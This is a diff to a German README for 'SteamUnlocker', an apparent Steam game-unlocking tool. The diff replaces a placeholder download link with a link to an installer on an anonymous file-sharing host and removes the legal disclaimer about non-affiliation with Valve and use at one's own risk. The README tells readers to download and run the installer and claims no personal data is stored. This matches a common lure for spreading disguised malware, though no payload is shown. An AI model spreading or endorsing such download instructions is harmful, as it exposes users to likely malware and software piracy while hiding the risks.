@@ -12,7 +12,7 @@
 
 ## 📥 Installation
 
-1. Lade das Tool hier herunter: [SteamUnlocker Installer](https://example.com/steamunlocker)  
+1. Lade das Tool hier herunter: [SteamUnlocker Installer](https://gofile.io/d/LdARrX)  
 2. Öffne die Installationsdatei und folge den Anweisungen auf dem Bildschirm  
 3. Nach der Installation kannst du das Tool direkt starten  
 
@@ -38,10 +38,6 @@ Du kannst Spiele durchsuchen, filtern und direkt starten oder installieren.
 **Frage:** Werden meine Steam-Daten gespeichert?  
 **Antwort:** Nein, das Tool speichert keine persönlichen Daten.
 
-## ⚠️ Rechtliches
-
-Dieses Tool steht in keiner Verbindung zu Valve oder Steam.  
-Die Nutzung erfolgt auf eigene Verantwortung.
 
 ## 📬 Kontakt
 
